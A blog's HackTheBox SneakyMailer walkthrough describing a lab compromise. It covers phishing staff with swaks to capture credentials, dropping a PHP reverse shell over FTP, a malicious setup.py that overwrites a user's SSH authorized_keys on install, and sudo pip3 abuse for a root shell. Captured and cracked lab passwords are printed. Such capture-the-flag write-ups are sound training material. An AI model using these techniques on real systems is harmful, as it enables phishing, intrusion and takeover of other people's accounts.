<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - SneakyMailer | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting"><meta name=description content="Example of a phishing attack and PyPI package exploitation"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.medium.com/hack-the-box-sneakymailer-10-10-10-197-scratch-cde6f3d21637><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - SneakyMailer"><meta property="og:description" content="Example of a phishing attack and PyPI package exploitation"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/sneakymailer/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/sneakymailer/imgs/image-20210428213153962.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2020-11-28T18:27:21+00:00"><meta property="article:modified_time" content="2021-04-28T21:28:30+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/sneakymailer/imgs/image-20210428213153962.png"><meta name=twitter:title content="HackTheBox - SneakyMailer"><meta name=twitter:description content="Example of a phishing attack and PyPI package exploitation"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - SneakyMailer","item":"https://fahmifj.github.io/hackthebox/sneakymailer/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - SneakyMailer","name":"HackTheBox - SneakyMailer","description":"Example of a phishing attack and PyPI package exploitation","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"SneakyMailer is a medium difficulty Linux machine from Hack The Box that features a phishing attack. The credentials obtained through phishing allow me to access one of the users’ mailboxes and obtain another credentials for FTP. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run pip3 with sudo privileges, and this can be leveraged to obtain root access.\nSkills Learned Phishing PyPI Package Exploitation Sudo exploitation on pip3 Tools Nmap Imap Reconnaissance Nmap → root@iamf «sneakymailer» «10.10.14.42» $ mkdir nmap; nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA) | 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA) |_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Did not follow redirect to http://sneakycorp.htb 143/tcp open imap Courier Imapd (released 2018) |_imap-capabilities: ENABLE STARTTLS UTF8=ACCEPTA0001 CHILDREN ACL ACL2=UNION THREAD=ORDEREDSUBJECT THREAD=REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Not valid before: 2020-05-14T17:14:21 |_Not valid after: 2021-05-14T17:14:21 |_ssl-date: TLS randomness does not represent time 993/tcp open ssl/imap Courier Imapd (released 2018) |_imap-capabilities: ENABLE AUTH=PLAIN CHILDREN ACL ACL2=UNION THREAD=ORDEREDSUBJECT THREAD=REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY UTF8=ACCEPTA0001 NAMESPACE | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Not valid before: 2020-05-14T17:14:21 |_Not valid after: 2021-05-14T17:14:21 |_ssl-date: TLS randomness does not represent time 8080/tcp open http nginx 1.14.2 |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: nginx/1.14.2 |_http-title: Welcome to nginx! Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel With an initial scan, nmap discovered seven ports open and also identified the services behind them.\nI’ll summarize the result:\nThere is an FTP service on port 21, but nmap shows no sign that anonymous login is allowed. An SSH service on port 22 Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993 And a web server hosting two sites on port 80 and 8080. nmap identifies the hostname as sneakycorp.htb. I’ll add sneakycorp.htb to my /etc/hosts file:\n→ root@iamf «sneakymailer» «10.10.14.42» $ echo '10.10.10.197 sneakycorp.htb' \u003e\u003e /etc/hosts Enumeration TCP 80 - Website Visiting sneakycorp.htb on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as “Complete!” while the other one seems still in progress for about 80%.\nClicking on the “Team” menu points to/team.php. This page shows a table contains the employees’ data of SneakyCorp.\nI saved the whole table data and stored it in a file called team.\nI can grab the emails using the grep and tr command as follows:\n→ root@iamf «sneakymailer» «10.10.14.42» $ cat team | egrep -o \"[^[:space:]]+@[^[:space:]]+\" | tr -d \"\u003c\u003e\" | tee emails.list I ran gobuster but it didn’t show any interesting results.\nTCP 8080 — Website It returns the default Nginx page.\nTCP 25 — SMTP (Mail) I tried to send an email, and it got queued.\nGiven a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.\nEmail Phishing I’ll setup netcat listener on port 80, and then I’ll use a tool called swaks to send an email containing my IP address to all the email addresses I’ve got.\n→ root@iamf «sneakymailer» «10.10.14.42» $ swaks --server '10.10.10.197' --to `cat emails.list | tr '\\n' ','` --from admin@sneakymailer.htb --body \"http://10.10.14.42/\" And there is an HTTP POST request coming to my listener.\nThe request body contains this data.\nfirstName=Paul\u0026lastName=Byrd\u0026email=paulbyrd%40sneakymailer.htb\u0026password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt\u0026rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt It can be decoded using an online url decoder.\nfirstName=Paul\u0026lastName=Byrd\u0026email=paulbyrd@sneakymailer.htb\u0026password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht\u0026rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht The parameter password and rpassword seem juicy where the r might refer to reset or retype the password. Unfortunately, the password doesn’t work on SSH and FTP.\nTCP 143 - IMAP With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I’ll need an email client, and I end up with sylpheed. You can install it with sudo apt-get install sylpheed.\nBut before moving on, I’ll add sneakymailer.htb to my/etc/hosts file to avoid problems with dns/name resolution.\n→ root@iamf «sneakymailer» «10.10.14.42» $ echo '10.10.10.197 sneakymailer.htb' \u003e\u003e /etc/hosts Initial Setup As this is my first install, I’ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on/root/sneaky/loot/Mail.\nNext I’ll have to determine the account type. Because the box only has IMAP listening and we’re not going outside VPN connection, then I should choose IMAP4.\nIn the following section, I’ll use the display name Paul and the email address paulbyrd@sneakymailer.htb that I obtained through phishing.\nI lost some of my screenshots after the step above, but here is the final configuration.\nLastly, enter paulbyrd’s password, ^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u003c:Ht, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.\nRetrieving the emails In Paul’s mailbox, I found two emails inside the “Sent Items” folder.\nThe first email was sent with the subject of “Password Reset”. In this email, Paul asks the administrator to change the developer account password. I’ll grab the credentials of the developer account.\nThe second email was sent with the subject “Module testing”, but right now I’m not sure what it is about.\nFoothold Shell as www-data FTP Access The developer account can be used to access the FTP server. There is only one directory called/dev in the FTP root directory.\nI access the FTP server via browser. The files inside this FTP look the same files as the one hosted on sneakycorp.htb, except it has the additional word “dev” in the title.\nReverse Shell via FTP Upload It turns out that the developer account has write permission on the /dev directory, so I can drop a PHP reverse shell payload there.\n211-FTP server status: Connected to ::ffff:10.10.14.20 Logged in as developer TYPE: ASCII No session bandwidth limit Session timeout in seconds is 300 Control connection is plain text Data connections will be plain text At session startup, client count was 1 vsFTPd 3.0.3 - secure, fast, stable ftp\u003e cd /dev 250 Directory successfully changed. ftp\u003e put /shares/reversef.php iamf.php local: /shares/reversef.php remote: iamf.php 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 72 bytes sent in 0.00 secs (2.8610 MB/s) The uploaded web shell is available on http://dev.sneakycorp.htb/iamf.php. I will add dev.sneakycorp.htb to my /etc/hosts first.\n→ root@iamf «sneakymailer» «10.10.14.42» $ echo '10.10.10.194' \u003e\u003e dev.sneakycorp.htb Now I can trigger my web shell with curl.\n→ root@iamf «sneakymailer» «10.10.14.42» $ curl -s http://dev.sneakycorp.htb/iamf.php My listener has an interactive shell now.\nPrivilege Escalation Shell as low Enumeration In /var/www, I found another subdomain. The new is pypi.sneakycorp.htb, I’ll add it to my /etc/hosts file.\nI discovered .htpasswd file inside pypi.sneakycorp.htb, which contains PyPI credentials.\nI’ll save pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/ to my note and send it to my Windows for cracking. In /home there is no user called pypi, so it might be used for something else.\nCracking Password The password can be cracked easily with John the Ripper.\nThe password is soufianeelhaoui\nMalicious PyPI package Looking at the web configuration file, there is another domain pypi.sneakycorp.htb which is accessible on localhost:5000.\nIt also accessible from remote on port 8080 if I specify the hostname, pypi.sneakycorp.htb.\nBased on the second email that Paul sent to user law.\nHello low Your current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience. The idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user low install the package (configured by the box’s author automatically).\nTo create a package, I’ll use the official site tutorial as my reference:\nhttps://packaging.python.org/tutorials/packaging-projects/ And you might want to read this too, https://packaging.python.org/specifications/pypirc/ First, I’ll get the setup.py template which looks like this:\nimport setuptools with open(\"README.md\", \"r\", encoding=\"utf-8\") as fh: long_description = fh.read() setuptools.setup( name=\"example-pkg-YOUR-USERNAME-HERE\", # Replace with your own username version=\"0.0.1\", author=\"Example Author\", author_email=\"author@example.com\", description=\"A small example package\", long_description=long_description, long_description_content_type=\"text/markdown\", url=\"https://github.com/pypa/sampleproject\", project_urls={ \"Bug Tracker\": \"https://github.com/pypa/sampleproject/issues\", }, classifiers=[ \"Programming Language :: Python :: 3\", \"License :: OSI Approved :: MIT License\", \"Operating System :: OS Independent\", ], package_dir={\"\": \"src\"}, packages=setuptools.find_packages(where=\"src\"), python_requires=\"\u003e=3.6\", ) My goal is only to insert my SSH public key to low’s authorized_keys, so I’ll need to modify the code to this:\nimport setuptools try: with open(\"/home/low/.ssh/authorized_keys\", \"w\") as f: f.write(\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd\") f.close() except Exception as e: pass setuptools.setup( name=\"low\", version=\"0.0.1\", author=\"Example Author\", author_email=\"author@example.com\", description=\"A small example package\", long_description=\"\", long_description_content_type=\"text/markdown\", url=\"https://github.com/pypa/sampleproject\", packages=setuptools.find_packages(), classifiers=[ \"Programming Language :: Python :: 3\", \"License :: OSI Approved :: MIT License\", \"Operating System :: OS Independent\", ], ) From the link above, in order to upload a package to the PyPI server, a file called .pypirc must be present at $HOME/.pypirc.\nThe file is required for authentication, so I’ll create one and put the PyPI credentials I obtained before.\n[distutils] index-servers = local [local] repository: http://127.0.0.1:5000 username: pypi password: soufianeelhaoui If I wanted to upload remotely, my .pypirc would look like this:\n[distutils] index-servers = remote [remote] repository: http://pypi.sneakycorp.htb:8080 username: pypi password: soufianeelhaoui I’ll transfer setup.py and .pypirc to /dev/shm of SneakyMailer via Python http server.\n→ root@iamf «exploits» «10.10.14.42» $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.197 - - [12/Jul/2020 08:24:12] \"GET /.pypirc HTTP/1.1\" 200 - 10.10.10.197 - - [12/Jul/2020 08:24:29] \"GET /setup.py HTTP/1.1\" 200 - On SneakyMailer:\nwww-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc \u003e .pypirc www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py \u003e setup.py Now at /dev/shm, the folder structure looks like this.\n. ├── .pypirc ├── iamf.php └── setup.py The last part is set $HOME to /dev/shm, because .pypirc should be placed at $HOME/.pypirc.\nwww-data@sneakymailer:/dev/shm$ export $HOME=/dev/shm After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.\nwww-data@sneakymailer:~$ python3 setup.py sdist upload -r local running sdist running egg_info writing low.egg-info/PKG-INFO writing dependency_links to low.egg-info/dependency_links.txt writing top-level names to low.egg-info/top_level.txt reading manifest file 'low.egg-info/SOURCES.txt' writing manifest file 'low.egg-info/SOURCES.txt' warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md running check creating low-0.0.1 creating low-0.0.1/low.egg-info copying files to low-0.0.1… copying setup.py -\u003e low-0.0.1 copying low.egg-info/PKG-INFO -\u003e low-0.0.1/low.egg-info copying low.egg-info/SOURCES.txt -\u003e low-0.0.1/low.egg-info copying low.egg-info/dependency_links.txt -\u003e low-0.0.1/low.egg-info copying low.egg-info/top_level.txt -\u003e low-0.0.1/low.egg-info Writing low-0.0.1/setup.cfg Creating tar archive removing 'low-0.0.1' (and everything under it) running upload Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/ Server response (200): OK WARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/) As long as I see the server response is 200, that means I have successfully uploaded the package.\nSSH Access Now I can login with my private key as user low.\n→ root@iamf «sneakymailer» «10.10.14.42» $ ssh -i id_ecdsa low@10.10.10.197 User flag is done here.\nShell as root Abusing sudo pip User low has sudo privileges on /usr/bin/pip3.\nI’ll follow the instruction from GTFOBins to abuse this circumstance to obtain the root flag.\nlow@sneakymailer:~$ TF=$(mktemp -d) low@sneakymailer:~$ low@sneakymailer:~$ echo 'raise Exception(open(\"/root/root.txt\").read())' \u003e $TF/setup.py low@sneakymailer:~$ low@sneakymailer:~$ sudo pip3 install $TF Or to get a shell as follows:\nlow@sneakymailer:~$ TF=$(mktemp -d) low@sneakymailer:~$ low@sneakymailer:~$ echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh \u003c$(tty) \u003e$(tty) 2\u003e$(tty)')\" \u003e $TF/setup.py low@sneakymailer:~$ low@sneakymailer:~$ sudo pip3 install $TF sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution Processing /tmp/tmp.9ShSegy5bm # whoami root # id uid=0(root) gid=0(root) groups=0(root) ","wordCount":"1951","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/sneakymailer/imgs/image-20210428213153962.png","datePublished":"2020-11-28T18:27:21.204Z","dateModified":"2021-04-28T21:28:30+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/sneakymailer/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - SneakyMailer</h1><p class=post-description>Example of a phishing attack and PyPI package exploitation</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>November 28, 2020
<span class=date-update>(Imported: April 28, 2021)</span></span>&nbsp;&#183;&nbsp;<span class=meta-read>10 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li><li><a href=#tcp-8080--website aria-label="TCP 8080 —  Website">TCP 8080 —  Website</a></li><li><a href=#tcp-25--smtp-mail aria-label="TCP 25  —  SMTP (Mail)">TCP 25  —  SMTP (Mail)</a></li><li><a href=#tcp-143---imap aria-label="TCP 143 - IMAP">TCP 143 - IMAP</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-www-data aria-label="Shell as www-data">Shell as www-data</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-low aria-label="Shell as low">Shell as low</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/sneakymailer/imgs/image-20210428213153962_hua70842fb3e2dfea225d4b13ba7cfbccc_151735_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/sneakymailer/imgs/image-20210428213153962_hua70842fb3e2dfea225d4b13ba7cfbccc_151735_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/sneakymailer/imgs/image-20210428213153962_hua70842fb3e2dfea225d4b13ba7cfbccc_151735_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/sneakymailer/imgs/image-20210428213153962.png 739w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/sneakymailer/imgs/image-20210428213153962.png alt="HackTheBox - SneakyMailer" width=739 height=449><p>HackTheBox - SneakyMailer</p></figure><p>SneakyMailer is a medium difficulty Linux machine from Hack The Box that features a phishing attack. The credentials obtained through phishing allow me to access one of the users&rsquo; mailboxes and obtain another credentials for FTP. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run <code>pip3</code> with sudo privileges, and this can be leveraged to obtain root access.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Phishing</li><li>PyPI Package Exploitation</li><li>Sudo exploitation on <code>pip3</code></li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Imap</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class=line><span class=cl>$ mkdir nmap<span class=p>;</span> nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>21/tcp   open  ftp      vsftpd 3.0.3
</span></span><span class=line><span class=cl>22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>25/tcp   open  smtp     Postfix smtpd
</span></span><span class=line><span class=cl><span class=p>|</span>_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
</span></span><span class=line><span class=cl>80/tcp   open  http     nginx 1.14.2
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.14.2
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://sneakycorp.htb
</span></span><span class=line><span class=cl>143/tcp  open  imap     Courier Imapd <span class=o>(</span>released 2018<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_imap-capabilities: ENABLE STARTTLS <span class=nv>UTF8</span><span class=o>=</span>ACCEPTA0001 CHILDREN ACL <span class=nv>ACL2</span><span class=o>=</span>UNION <span class=nv>THREAD</span><span class=o>=</span>ORDEREDSUBJECT <span class=nv>THREAD</span><span class=o>=</span>REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>localhost/organizationName<span class=o>=</span>Courier Mail Server/stateOrProvinceName<span class=o>=</span>NY/countryName<span class=o>=</span>US
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: email:postmaster@example.com
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2020-05-14T17:14:21
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2021-05-14T17:14:21
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl>993/tcp  open  ssl/imap Courier Imapd <span class=o>(</span>released 2018<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_imap-capabilities: ENABLE <span class=nv>AUTH</span><span class=o>=</span>PLAIN CHILDREN ACL <span class=nv>ACL2</span><span class=o>=</span>UNION <span class=nv>THREAD</span><span class=o>=</span>ORDEREDSUBJECT <span class=nv>THREAD</span><span class=o>=</span>REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY <span class=nv>UTF8</span><span class=o>=</span>ACCEPTA0001 NAMESPACE
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>localhost/organizationName<span class=o>=</span>Courier Mail Server/stateOrProvinceName<span class=o>=</span>NY/countryName<span class=o>=</span>US
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: email:postmaster@example.com
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2020-05-14T17:14:21
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2021-05-14T17:14:21
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl>8080/tcp open  http     nginx 1.14.2
</span></span><span class=line><span class=cl><span class=p>|</span>_http-open-proxy: Proxy might be redirecting requests
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.14.2
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Welcome to nginx!
</span></span><span class=line><span class=cl>Service Info: Host:  debian<span class=p>;</span> OSs: Unix, Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>With an initial scan, <code>nmap</code> discovered seven ports open and also identified the services behind them.</p><p>I’ll summarize the result:</p><ul><li>There is an FTP service on port 21, but <code>nmap</code> shows no sign that anonymous login is allowed.</li><li>An SSH service on port 22</li><li>Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993</li><li>And a web server hosting two sites on port 80 and 8080. <code>nmap</code> identifies the hostname as <code>sneakycorp.htb</code>.</li></ul><p>I’ll add <code>sneakycorp.htb</code> to my <code>/etc/hosts</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.197 sneakycorp.htb&#39;</span> &gt;&gt; /etc/hosts 
